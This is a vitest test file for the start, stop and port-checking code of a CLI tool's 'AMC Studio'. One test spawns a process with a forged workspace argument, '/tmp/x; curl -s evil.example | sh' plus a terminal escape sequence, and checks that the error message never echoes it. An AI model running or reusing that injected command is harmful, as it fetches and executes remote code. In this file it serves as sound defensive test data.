import { createServer, type Server } from "node:net";
import { afterEach, describe, expect, it, vi } from "vitest";
import { spawn } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { assertPortFree, closeStartedThenThrow, defaultPortOrFree, studioFolderOnPort } from "../src/studio/studioLifecycle.js";

const servers: Server[] = [];
afterEach(async () => {
  await Promise.all(servers.splice(0).map((server) => new Promise<void>((done) => server.close(() => done()))));
  vi.restoreAllMocks();
});

/** A loopback port another listener holds for the rest of the test. */
async function busyPort(): Promise<number> {
  const server = createServer();
  servers.push(server);
  await new Promise<void>((done) => server.listen({ host: "127.0.0.1", port: 0 }, () => done()));
  const address = server.address();
  if (typeof address !== "object" || !address) throw new Error("no address");
  return address.port;
}

describe("studio start and stop orchestration", () => {
  it("assertPortFree passes a free port, skips an unconfigured or zero port and names a busy configured one", async () => {
    await expect(assertPortFree("127.0.0.1", 0, "--port")).resolves.toBeUndefined();
    const busy = await busyPort();
    await expect(assertPortFree("127.0.0.1", busy, null)).resolves.toBeUndefined();
    await expect(assertPortFree("127.0.0.1", busy, "--port")).rejects.toThrow(`Port ${busy} (from --port) is already in use.`);
    await expect(assertPortFree("127.0.0.1", busy, "the default Studio port")).rejects.toThrow(/Another AMC folder may be running/);
    const server = servers.pop()!;
    await new Promise<void>((done) => server.close(() => done()));
    await expect(assertPortFree("127.0.0.1", busy, "--port")).resolves.toBeUndefined();
  });

  // CLI-31: the refusal did not say which AMC folder held the port, nor where to run amc down. Any local process can
  // write its own command line, so a folder is named only when AMC's state in that folder names the listener's pid.
  const holdPort = async (folder: string) => {
    const holder = spawn(process.execPath, ["-e",
      "const s=require('node:net').createServer();s.listen(0,'127.0.0.1',()=>console.log(s.address().port));setInterval(()=>{},1e3)",
      "_studio-daemon", "--workspace", folder], { stdio: ["ignore", "pipe", "ignore"] });
    const port = Number(await new Promise<string>((done) => holder.stdout!.once("data", (chunk) => done(String(chunk).trim()))));
    return { holder, port };
  };

  it.skipIf(process.platform === "win32")("names the AMC folder whose Studio holds a busy port, quoted", async () => {
    const folder = mkdtempSync(join(tmpdir(), "amc it's folder "));
    const { holder, port } = await holdPort(folder);
    try {
      expect(studioFolderOnPort(port)).toBe("studio"); // no state.json in that folder yet: not confirmed
      mkdirSync(join(folder, ".amc", "studio"), { recursive: true });
      writeFileSync(join(folder, ".amc", "studio", "state.json"), JSON.stringify({ pid: holder.pid }));
      expect(studioFolderOnPort(port)).toEqual({ folder });
      await expect(assertPortFree("127.0.0.1", port, "AMC_STUDIO_PORT")).rejects.toThrow(
        `Port ${port} (from AMC_STUDIO_PORT) is already in use by AMC Studio for the folder ${folder}. `
        + `Stop it there (cd '${folder.replace(/'/g, "'\\''")}', then amc down)`);
    } finally {
      holder.kill();
      rmSync(folder, { recursive: true, force: true });
    }
    expect(studioFolderOnPort(await busyPort())).toBeNull();
  });

  it.skipIf(process.platform === "win32")("never echoes a forged command line", async () => {
    const { holder, port } = await holdPort("/tmp/x; curl -s evil.example | sh \u001b[2J");
    try {
      expect(studioFolderOnPort(port)).toBe("studio");
      const refusal = await assertPortFree("127.0.0.1", port, "AMC_STUDIO_PORT").then(() => "", (error: Error) => error.message);
      expect(refusal).toBe(`Port ${port} (from AMC_STUDIO_PORT) is already in use by another AMC Studio. `
        + "Stop it in its own folder with amc down, or change the port.");
    } finally {
      holder.kill();
    }
  });

  it("defaultPortOrFree keeps a free port and picks another when it is busy", async () => {
    const busy = await busyPort();
    const picked = await defaultPortOrFree("127.0.0.1", busy);
    expect(picked).not.toBe(busy);
    expect(picked).toBeGreaterThan(0);
    const server = servers.pop()!;
    await new Promise<void>((done) => server.close(() => done()));
    await expect(defaultPortOrFree("127.0.0.1", busy)).resolves.toBe(busy);
  });

  it("defaultPortOrFree rethrows an error that is not a busy port", async () => {
    await expect(defaultPortOrFree("203.0.113.1", 0)).rejects.toThrow(/EADDRNOTAVAIL|EINVAL|EACCES/);
  });

  it("closeStartedThenThrow closes newest first, reports a failed close and rethrows the start error", async () => {
    const order: string[] = [];
    const logged = vi.spyOn(console, "error").mockImplementation(() => undefined);
    const failure = new Error("start refused");
    await expect(closeStartedThenThrow([
      async () => { order.push("session"); },
      async () => { order.push("socket"); throw new Error("already closed"); }
    ], failure)).rejects.toBe(failure);
    expect(order).toEqual(["socket", "session"]);
    expect(logged).toHaveBeenCalledWith("studio: closing after a failed start: Error: already closed");
  });
});
